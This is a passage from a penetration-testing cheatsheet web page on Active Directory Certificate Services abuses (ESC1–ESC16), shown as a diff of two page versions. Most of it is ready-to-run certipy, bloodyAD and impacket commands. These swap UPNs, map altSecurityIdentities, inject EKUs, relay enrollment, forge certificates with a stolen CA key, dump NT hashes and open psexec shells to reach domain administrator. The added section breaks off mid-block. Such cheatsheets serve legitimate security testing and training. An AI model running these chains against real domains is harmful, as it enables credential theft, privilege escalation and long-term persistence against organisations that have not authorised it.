-<p>Template has <code>msPKI-Enrollment-Flag</code> with <code>NO_SECURITY_EXTENSION</code> set. Without the SID extension, post-CVE-2022-26923 DCs map the cert based on UPN alone. Combine with WriteAccountUPN or GenericWrite on a target user.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Step 1: Set victim&#39;s UPN to match Administrator (you need GenericWrite on victim)</span>
-</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> <span class="nb">set</span> object victim userPrincipalName -v <span class="s1">&#39;Administrator&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Step 2: Request the cert as victim (without -sid since template has no security ext)</span>
-</span></span><span class="line"><span class="cl">certipy req -u victim@<span class="nv">$DOMAIN</span> -p <span class="nv">$VICTIM_PASS</span> -dc-ip <span class="nv">$DC</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -target <span class="nv">$CA_HOST</span> -ca <span class="nv">$CA</span> -template ESC9Template
-</span></span><span class="line"><span class="cl"><span class="c1">## Step 3: Reset victim&#39;s UPN to avoid disrupting service</span>
-</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> <span class="nb">set</span> object victim userPrincipalName -v <span class="s1">&#39;victim@corp.local&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Step 4: Auth with the cert -&gt; Administrator</span>
-</span></span><span class="line"><span class="cl">certipy auth -pfx victim.pfx -dc-ip <span class="nv">$DC</span> -username administrator -domain <span class="nv">$DOMAIN</span>
-</span></span></code></pre></div><h2 id="xi-esc10---weak-certificate-mapping" data-heading-permalink="true"><span class="heading-content">xi. ESC10 - Weak certificate mapping</span>
-    <a class="heading-permalink" href="#xi-esc10---weak-certificate-mapping" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Registry <code>CertificateMappingMethods</code> allows UPN-only mapping (<code>0x4</code>) or weak explicit map (<code>0x8</code>). Same UPN-swap chain as ESC9.</p>
-<h2 id="xii-esc11---relay-to-icpr-rpc-no-encryption-enforced" data-heading-permalink="true"><span class="heading-content">xii. ESC11 - Relay to ICPR RPC (no encryption enforced)</span>
-    <a class="heading-permalink" href="#xii-esc11---relay-to-icpr-rpc-no-encryption-enforced" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Same chain as ESC8 but RPC endpoint instead of HTTP. Useful when web enrollment is disabled but ICPR is exposed.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## certipy relay supports RPC scheme:</span>
-</span></span><span class="line"><span class="cl">certipy relay -target <span class="s2">&#34;rpc://</span><span class="nv">$CA_HOST</span><span class="s2">&#34;</span> -template DomainController
-</span></span><span class="line"><span class="cl"><span class="c1">## Coerce as in ESC8</span>
-</span></span></code></pre></div><h2 id="xiii-esc12---tpm-bound-key-validation-bypass" data-heading-permalink="true"><span class="heading-content">xiii. ESC12 - TPM-bound key validation bypass</span>
-    <a class="heading-permalink" href="#xiii-esc12---tpm-bound-key-validation-bypass" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Requires code execution on a CA with TPM-attached. Out of scope for standard pentest workflows - read the certipy wiki if you encounter this scenario.</p>
-<h2 id="xiv-esc13---issuance-policy-oid---group" data-heading-permalink="true"><span class="heading-content">xiv. ESC13 - Issuance Policy OID -&gt; group</span>
-    <a class="heading-permalink" href="#xiv-esc13---issuance-policy-oid---group" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Template has an Issuance Policy OID that&rsquo;s linked to a privileged group via <code>msDS-OIDToGroupLink</code>. Enrolling = automatic group membership in the linked group.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Certipy find flags this with ESC13</span>
-</span></span><span class="line"><span class="cl">certipy req -u <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span> -p <span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -target <span class="nv">$CA_HOST</span> -ca <span class="nv">$CA</span> -template ESC13Template
-</span></span><span class="line"><span class="cl"><span class="c1">## When authenticating, you get the group membership baked into the PAC:</span>
-</span></span><span class="line"><span class="cl">certipy auth -pfx user.pfx -dc-ip <span class="nv">$DC</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## You now have Admin group rights via the cert&#39;s policy OID</span>
-</span></span></code></pre></div><h2 id="xv-esc14---weak-altsecurityidentities" data-heading-permalink="true"><span class="heading-content">xv. ESC14 - Weak altSecurityIdentities</span>
-    <a class="heading-permalink" href="#xv-esc14---weak-altsecurityidentities" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>You can write <code>altSecurityIdentities</code> on a target user. Add a mapping that points to a cert you control, then authenticate with that cert as the victim.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Step 1: Get a cert with a known issuer + serial</span>
-</span></span><span class="line"><span class="cl">certipy req -u <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span> -p <span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span> -target <span class="nv">$CA_HOST</span> -ca <span class="nv">$CA</span> -template User
-</span></span><span class="line"><span class="cl"><span class="c1">## Step 2: Get the cert&#39;s issuer and serial (output of certipy includes them)</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Step 3: Map them to victim&#39;s altSecurityIdentities</span>
-</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> <span class="nb">set</span> object victim altSecurityIdentities <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -v <span class="s1">&#39;X509:&lt;I&gt;CN=CORP-CA,DC=corp,DC=local&lt;S&gt;CN=svc_user&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Step 4: Authenticate AS victim using your cert</span>
-</span></span><span class="line"><span class="cl">certipy auth -pfx svc_user.pfx -dc-ip <span class="nv">$DC</span> -username victim -domain <span class="nv">$DOMAIN</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Step 5: Cleanup</span>
-</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> <span class="nb">set</span> object victim altSecurityIdentities
-</span></span></code></pre></div><h2 id="xvi-esc15--ekuwu-cve-2024-49019" data-heading-permalink="true"><span class="heading-content">xvi. ESC15 / EKUwu (CVE-2024-49019)</span>
-    <a class="heading-permalink" href="#xvi-esc15--ekuwu-cve-2024-49019" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Template based on Schema V1 with &ldquo;Supply in Request&rdquo; lets you inject EKUs via Application Policies. Patched as CVE-2024-49019 in late 2024 - boxes built before the patch still vulnerable.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Detection via certipy find -vulnerable</span>
-</span></span><span class="line"><span class="cl">certipy req -u <span class="nv">$USER</span>@<span class="nv">$DOMAIN</span> -p <span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -target <span class="nv">$CA_HOST</span> -ca <span class="nv">$CA</span> -template WebServer <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -application-policies <span class="s1">&#39;Client Authentication&#39;</span> <span class="se">\
-</span></span></span><span class="line"><span class="cl">  -upn Administrator@<span class="nv">$DOMAIN</span>
-</span></span><span class="line"><span class="cl">certipy auth -pfx administrator.pfx -dc-ip <span class="nv">$DC</span>
-</span></span></code></pre></div><h2 id="xvii-esc16---disabled-sid-extension-on-ca-cve-related-2025" data-heading-permalink="true"><span class="heading-content">xvii. ESC16 - Disabled SID extension on CA (CVE-related, 2025)</span>
-    <a class="heading-permalink" href="#xvii-esc16---disabled-sid-extension-on-ca-cve-related-2025" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>CA has the SID extension disabled globally. All templates effectively act like ESC9. Same exploitation chain - UPN-swap a victim, request cert, swap back.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Same chain as ESC9 (section x)</span>
-</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> <span class="nb">set</span> object victim userPrincipalName -v <span class="s1">&#39;Administrator&#39;</span>
-</span></span><span class="line"><span class="cl">certipy req -u victim@<span class="nv">$DOMAIN</span> -p <span class="nv">$VICTIM_PASS</span> -dc-ip <span class="nv">$DC</span> -target <span class="nv">$CA_HOST</span> -ca <span class="nv">$CA</span> -template User
-</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> <span class="nb">set</span> object victim userPrincipalName -v <span class="s1">&#39;victim@corp.local&#39;</span>
-</span></span><span class="line"><span class="cl">certipy auth -pfx victim.pfx -dc-ip <span class="nv">$DC</span> -username administrator -domain <span class="nv">$DOMAIN</span>
-</span></span></code></pre></div><h2 id="xviii-shadow-credentials-via-cert" data-heading-permalink="true"><span class="heading-content">xviii. Shadow Credentials via cert</span>
-    <a class="heading-permalink" href="#xviii-shadow-credentials-via-cert" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>When you have GenericWrite on a user and AD CS is enabled, the shadow credentials attack uses the <code>msDS-KeyCredentialLink</code> attribute to associate a cert with the user. bloodyAD wraps the whole flow:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> add shadowCredentials victim
-</span></span><span class="line"><span class="cl"><span class="c1">## Output: victim.ccache (TGT) or victim.pfx (cert + key, if PKINIT fails)</span>
-</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>victim.ccache
-</span></span><span class="line"><span class="cl"><span class="c1">## or:</span>
-</span></span><span class="line"><span class="cl">certipy auth -pfx victim.pfx -dc-ip <span class="nv">$DC</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Cleanup:</span>
-</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> remove shadowCredentials victim
-</span></span></code></pre></div><p>DC must be Server 2016+ for msDS-KeyCredentialLink schema.</p>
-<h2 id="xix-certipy-auth-output-options" data-heading-permalink="true"><span class="heading-content">xix. Certipy auth output options</span>
-    <a class="heading-permalink" href="#xix-certipy-auth-output-options" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Standard auth, dump NT hash + save TGT:</span>
-</span></span><span class="line"><span class="cl">certipy auth -pfx victim.pfx -dc-ip <span class="nv">$DC</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## When the cert has no UPN (e.g. machine account):</span>
-</span></span><span class="line"><span class="cl">certipy auth -pfx machine.pfx -dc-ip <span class="nv">$DC</span> -username <span class="s1">&#39;COMPUTER$&#39;</span> -domain <span class="nv">$DOMAIN</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Save the resulting ccache and use it for impacket:</span>
-</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>/Administrator.ccache
-</span></span><span class="line"><span class="cl">impacket-psexec -k -no-pass dc.<span class="nv">$DOMAIN</span>
-</span></span><span class="line"><span class="cl"><span class="c1">## Get the NT hash directly without saving ccache:</span>
-</span></span><span class="line"><span class="cl">certipy auth -pfx victim.pfx -dc-ip <span class="nv">$DC</span> -no-save -print
-</span></span></code></pre></div><h2 id="xx-forging-certs-post-da-persistence" data-heading-permalink="true"><span class="heading-content">xx. Forging certs (post-DA persistence)</span>
-    <a class="heading-permalink" href="#xx-forging-certs-post-da-persistence" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Once you have the CA&rsquo;s private key (via <code>lsadump::ca</code> on the CA host, or HSM extraction):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy forge -ca-pfx ca.pfx -upn Administrator@<span class="nv">$DOMAIN</span> -subject <span class="s1">&#39;CN=Administrator&#39;</span>
-</span></span><span class="line"><span class="cl">certipy auth -pfx Administrator_forged.pfx -dc-ip <span class="nv">$DC</span>
-</span></span></code></pre></div><p>Forged certs survive password changes and last as long as the CA cert. Common long-term persistence.</p>
-<h2 id="xxi-quick-reference" data-heading-permalink="true"><span class="heading-content">xxi. Quick reference</span>
-    <a class="heading-permalink" href="#xxi-quick-reference" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<table>
-  <thead>
-      <tr>
-          <th>ESC</th>
-          <th>Trigger</th>
-          <th>Exploit</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td>ESC1</td>
-          <td>Supply SAN + Client Auth</td>
-          <td><code>certipy req -upn Administrator -sid SID</code></td>
-      </tr>
-      <tr>
-          <td>ESC2</td>
-          <td>Any Purpose EKU</td>
-          <td>same as ESC1</td>
-      </tr>
-      <tr>
-          <td>ESC3</td>
-          <td>Enrollment Agent EKU</td>
-          <td>enroll EA cert, then <code>-on-behalf-of</code></td>
-      </tr>
-      <tr>
-          <td>ESC4</td>
-          <td>Template WriteDacl</td>
-          <td><code>certipy template -write-default-configuration</code> -&gt; ESC1</td>
-      </tr>
-      <tr>
-          <td>ESC5</td>
-          <td>Object owner / weak DACL on PKI obj</td>
-          <td>chain to ESC4 or republish CA</td>
-      </tr>
-      <tr>
-          <td>ESC6</td>
-          <td>CA flag EDITF_ATTRIBUTESUBJECTALTNAME2</td>
-          <td>any auth template -&gt; ESC1</td>
-      </tr>
-      <tr>
-          <td>ESC7</td>
-          <td>ManageCA / ManageCertificates</td>
-          <td>enable ESC6 or approve pending request</td>
-      </tr>
-      <tr>
-          <td>ESC8</td>
-          <td>HTTP cert enroll + NTLM</td>
-          <td><code>certipy relay</code> + coerce</td>
-      </tr>
-      <tr>
-          <td>ESC9</td>
-          <td>NO_SECURITY_EXTENSION on template</td>
-          <td>UPN swap with bloodyAD</td>
-      </tr>
-      <tr>
-          <td>ESC10</td>
-          <td>Weak CertificateMappingMethods</td>
-          <td>UPN swap</td>
-      </tr>
-      <tr>
-          <td>ESC11</td>
-          <td>ICPR RPC no encryption</td>
-          <td><code>certipy relay rpc://</code> + coerce</td>
-      </tr>
-      <tr>
-          <td>ESC12</td>
-          <td>TPM CA + execution</td>
-          <td>rare, manual</td>
-      </tr>
-      <tr>
-          <td>ESC13</td>
-          <td>Policy OID -&gt; group link</td>
-          <td><code>certipy req</code> -&gt; inherit group</td>
-      </tr>
-      <tr>
-          <td>ESC14</td>
-          <td>Write altSecurityIdentities</td>
-          <td>bloodyAD set + certipy auth</td>
-      </tr>
-      <tr>
-          <td>ESC15</td>
-          <td>EKUwu Schema V1</td>
-          <td><code>-application-policies</code></td>
-      </tr>
-      <tr>
-          <td>ESC16</td>
-          <td>CA globally no-SID-ext</td>
-          <td>UPN swap on any auth template</td>
-      </tr>
-  </tbody>
-</table>
-
-        </div>
-
-        
-          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/active-directory/ad08-delegation/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Previous</span>
-              <span class="cheatsheet-pager-title">Delegation</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/active-directory/ad10-lateral-movement/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Next</span>
-              <span class="cheatsheet-pager-title">Lateral Movement</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a></nav>
-        
-      </div>
-    </div>
-  </article>
-  
-
-  </main>
-  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
-    <svg viewBox="0 0 24 24" aria-hidden="true">
-      <path d="M12 18V6"></path>
-      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
-    </svg>
-  </button>
-  <footer class="site-footer">
-  <p>&copy; 2026 JinPwn</p>
-</footer>
-
-</body>
-</html>
+<!doctype html><html lang=en-US dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>ADCS ESC1-16 | JinPwn</title><meta name=description content="Active Directory Certificate Services misconfigurations, ESC1 through ESC16. Certipy v5 covers detection and exploitation for almost all of them."><meta name=robots content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><meta name=googlebot content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><link rel=canonical href=https://jinpwn.dev/cheatsheets/active-directory/ad09-adcs-esc1-16/><meta property="og:title" content="ADCS ESC1-16 | JinPwn"><meta property="og:description" content="Active Directory Certificate Services misconfigurations, ESC1 through ESC16. Certipy v5 covers detection and exploitation for almost all of them."><meta property="og:type" content="website"><meta property="og:url" content="https://jinpwn.dev/cheatsheets/active-directory/ad09-adcs-esc1-16/"><meta property="og:site_name" content="JinPwn"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="ADCS ESC1-16 | JinPwn"><meta name=twitter:description content="Active Directory Certificate Services misconfigurations, ESC1 through ESC16. Certipy v5 covers detection and exploitation for almost all of them."><meta name=twitter:image content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:site content="@jinpwn"><meta name=twitter:creator content="@jinpwn"><script type=application/ld+json>{"@context":"https://schema.org","@type":"WebPage","description":"Active Directory Certificate Services misconfigurations, ESC1 through ESC16. Certipy v5 covers detection and exploitation for almost all of them.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"ADCS ESC1-16 | JinPwn","url":"https://jinpwn.dev/cheatsheets/active-directory/ad09-adcs-esc1-16/"}</script><meta name=theme-color content="#111111"><link rel=icon type=image/png href=/favicon.png><link rel=stylesheet href=/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin=anonymous><script src=/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin=anonymous defer></script><script src=/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin=anonymous defer></script></head><body><header class=site-header><nav class=top-nav><div class="container nav-inner"><div class=nav-left><a href=/ class="brand-link has-logo" aria-label=Home><img src=/favicon.png alt=jinpwn.dev class=brand-logo style=--brand-logo-height:36px></a><div class="nav-links desktop-only"><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></div><div class=nav-actions><div class=search-anchor id=search-root data-search-root><label class=search-trigger for=search-input><span class=search-glyph aria-hidden=true><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</span><input id=search-input type=search placeholder=Search... autocomplete=off spellcheck=false aria-label="Search posts and cheatsheets">
+<button type=button class=search-clear data-search-clear aria-label="Clear search" hidden>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg>
+</button>
+<span class="search-trigger-shortcut desktop-only" aria-hidden=true>CTRL K</span></label><div id=search-dropdown class=search-dropdown hidden data-search-index-url=/search-index.json data-search-runtime-url=/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js><p class=search-status data-search-status aria-live=polite>Type to search posts and cheatsheets.</p><div class=search-results data-search-results role=listbox aria-label="Search results"><p class=search-empty>Type to search posts and cheatsheets.</p></div></div></div><button class="icon-button mobile-only" type=button data-search-mobile-toggle aria-label=Search aria-expanded=false aria-controls=search-root>
+<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</button>
+<button class="icon-button mobile-only" type=button data-mobile-toggle aria-label="Toggle menu" aria-expanded=false aria-controls=mobile-nav>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon=""><path d="M3 6h18"/><path d="M3 12h18"/><path d="M3 18h18"/></svg>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon="" hidden=""><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div></div><div id=mobile-nav class=mobile-nav><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></nav></header><main class=site-main><article class="container cheatsheet-docs-shell"><div class=cheatsheet-docs-layout><aside class=cheatsheet-sidebar aria-label="Active Directory Pentesting navigation"><div class=cheatsheet-sidebar-inner><a href=/cheatsheets/ class=cheatsheet-sidebar-root>All cheatsheets</a>
+<a href=/cheatsheets/active-directory/ class=cheatsheet-sidebar-section>Active Directory Pentesting</a><nav class=cheatsheet-sidebar-nav><ul class=cheatsheet-sidebar-list><li><a href=/cheatsheets/active-directory/00-ad-moc/ class=cheatsheet-sidebar-link>AD MOC</a></li><li><a href=/cheatsheets/active-directory/ad01-enumeration/ class=cheatsheet-sidebar-link>Enumeration</a></li><li><a href=/cheatsheets/active-directory/ad02-bloodhound/ class=cheatsheet-sidebar-link>BloodHound</a></li><li><a href=/cheatsheets/active-directory/ad03-kerberoasting/ class=cheatsheet-sidebar-link>Kerberoasting</a></li><li><a href=/cheatsheets/active-directory/ad04-as-rep-roasting/ class=cheatsheet-sidebar-link>AS-REP Roasting</a></li><li><a href=/cheatsheets/active-directory/ad05-password-spraying/ class=cheatsheet-sidebar-link>Password Spraying</a></li><li><a href=/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/ class=cheatsheet-sidebar-link>LLMNR & NTLM Relay</a></li><li><a href=/cheatsheets/active-directory/ad07-acl-abuse/ class=cheatsheet-sidebar-link>ACL Abuse</a></li><li><a href=/cheatsheets/active-directory/ad08-delegation/ class=cheatsheet-sidebar-link>Delegation</a></li><li><a href=/cheatsheets/active-directory/ad09-adcs-esc1-16/ class="cheatsheet-sidebar-link is-current">ADCS ESC1-16</a></li><li><a href=/cheatsheets/active-directory/ad10-lateral-movement/ class=cheatsheet-sidebar-link>Lateral Movement</a></li><li><a href=/cheatsheets/active-directory/ad11-credential-dumping/ class=cheatsheet-sidebar-link>Credential Dumping</a></li><li><a href=/cheatsheets/active-directory/ad12-dcsync/ class=cheatsheet-sidebar-link>DCSync</a></li><li><a href=/cheatsheets/active-directory/ad13-trust-attacks/ class=cheatsheet-sidebar-link>Trust Attacks</a></li><li><a href=/cheatsheets/active-directory/ad14-persistence/ class=cheatsheet-sidebar-link>Persistence</a></li></ul></nav></div></aside><div class="cheatsheet-docs-main cheatsheet-page-main"><header class=cheatsheet-page-header><h1>ADCS ESC1-16</h1></header><details class=cheatsheet-mobile-sections><summary class=cheatsheet-mobile-sections-summary><span class=cheatsheet-mobile-sections-label>Sections</span>
+<span class=cheatsheet-mobile-sections-current>ADCS ESC1-16</span>
+<span class=cheatsheet-mobile-sections-caret aria-hidden=true></span></summary><div class=cheatsheet-mobile-sections-panel><nav aria-label="Active Directory Pentesting sections"><ul class=cheatsheet-mobile-sections-list><li><a href=/cheatsheets/ class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a></li><li><a href=/cheatsheets/active-directory/ class=cheatsheet-mobile-sections-link>Overview</a></li><li><a href=/cheatsheets/active-directory/00-ad-moc/ class=cheatsheet-mobile-sections-link>AD MOC</a></li><li><a href=/cheatsheets/active-directory/ad01-enumeration/ class=cheatsheet-mobile-sections-link>Enumeration</a></li><li><a href=/cheatsheets/active-directory/ad02-bloodhound/ class=cheatsheet-mobile-sections-link>BloodHound</a></li><li><a href=/cheatsheets/active-directory/ad03-kerberoasting/ class=cheatsheet-mobile-sections-link>Kerberoasting</a></li><li><a href=/cheatsheets/active-directory/ad04-as-rep-roasting/ class=cheatsheet-mobile-sections-link>AS-REP Roasting</a></li><li><a href=/cheatsheets/active-directory/ad05-password-spraying/ class=cheatsheet-mobile-sections-link>Password Spraying</a></li><li><a href=/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/ class=cheatsheet-mobile-sections-link>LLMNR & NTLM Relay</a></li><li><a href=/cheatsheets/active-directory/ad07-acl-abuse/ class=cheatsheet-mobile-sections-link>ACL Abuse</a></li><li><a href=/cheatsheets/active-directory/ad08-delegation/ class=cheatsheet-mobile-sections-link>Delegation</a></li><li><a href=/cheatsheets/active-directory/ad09-adcs-esc1-16/ class="cheatsheet-mobile-sections-link is-current">ADCS ESC1-16</a></li><li><a href=/cheatsheets/active-directory/ad10-lateral-movement/ class=cheatsheet-mobile-sections-link>Lateral Movement</a></li><li><a href=/cheatsheets/active-directory/ad11-credential-dumping/ class=cheatsheet-mobile-sections-link>Credential Dumping</a></li><li><a href=/cheatsheets/active-directory/ad12-dcsync/ class=cheatsheet-mobile-sections-link>DCSync</a></li><li><a href=/cheatsheets/active-directory/ad13-trust-attacks/ class=cheatsheet-mobile-sections-link>Trust Attacks</a></li><li><a href=/cheatsheets/active-directory/ad14-persistence/ class=cheatsheet-mobile-sections-link>Persistence</a></li></ul></nav></div></details><div class="markdown-content cheatsheet-page-body"><p>Active Directory Certificate Services misconfigurations, ESC1 through ESC16. Certipy v5 covers detection and exploitation for almost all of them.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>DC</span><span class=o>=</span>10.10.11.50
+</span></span><span class=line><span class=cl><span class=nv>DOMAIN</span><span class=o>=</span>corp.local
+</span></span><span class=line><span class=cl><span class=nv>USER</span><span class=o>=</span><span class=s1>&#39;svc_user&#39;</span>
+</span></span><span class=line><span class=cl><span class=nv>PASS</span><span class=o>=</span><span class=s1>&#39;Password1&#39;</span>
+</span></span><span class=line><span class=cl><span class=nv>CA</span><span class=o>=</span><span class=s1>&#39;CORP-CA&#39;</span>
+</span></span><span class=line><span class=cl><span class=nv>CA_HOST</span><span class=o>=</span><span class=s1>&#39;ca.corp.local&#39;</span>
+</span></span></code></pre></div><h2 id=i-enumerate data-heading-permalink=true><span class=heading-content>i. Enumerate</span>
+<a class=heading-permalink href=#i-enumerate aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Certipy find shows everything: templates, CA config, vulnerabilities flagged per template:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>certipy find -u <span class=nv>$USER</span>@<span class=nv>$DOMAIN</span> -p <span class=nv>$PASS</span> -dc-ip <span class=nv>$DC</span> -stdout
+</span></span><span class=line><span class=cl><span class=c1>## Just vulnerable ones, less noise:</span>
+</span></span><span class=line><span class=cl>certipy find -u <span class=nv>$USER</span>@<span class=nv>$DOMAIN</span> -p <span class=nv>$PASS</span> -dc-ip <span class=nv>$DC</span> -stdout -vulnerable
+</span></span><span class=line><span class=cl><span class=c1>## Hide admin permissions to reduce output:</span>
+</span></span><span class=line><span class=cl>certipy find -u <span class=nv>$USER</span>@<span class=nv>$DOMAIN</span> -p <span class=nv>$PASS</span> -dc-ip <span class=nv>$DC</span> -stdout -hide-admins -vulnerable
+</span></span><span class=line><span class=cl><span class=c1>## Save full output to JSON + TXT for reference:</span>
